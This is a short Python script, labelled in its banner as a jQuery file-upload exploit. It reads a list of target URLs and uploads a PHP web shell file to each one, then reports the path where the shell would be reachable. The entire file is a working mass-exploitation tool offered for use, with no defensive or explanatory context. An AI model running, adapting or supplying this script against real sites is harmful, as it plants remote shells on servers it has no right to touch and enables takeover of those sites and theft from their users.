import requests
import os
def banner():
	os.system('clear')
	print('''
    _                        
   (_)__ _ _  _ ___ _ _ _  _ 
   | / _` | || / -_) '_| || |
  _/ \__, |\_,_\___|_|  \_, |
 |__/   |_|             |__/ 
         file-upload exploit      
              
         Coded by X-Ray''')
                
def main():
	site = input("\n Enter site list::> ")
	shell ='mcpx.php'#yourshell.php
	opened = open(site)
	for x in opened:
		x = x.strip()
		files = {'files': open(shell, 'rb')}
		r = requests.post(x, files=files)
		if r.status_code==200:
			print("\nSuccess==>",x+'files/'+shell)
		else:
			print("\nFail==>",x+'files/'+shell)

banner()
main()    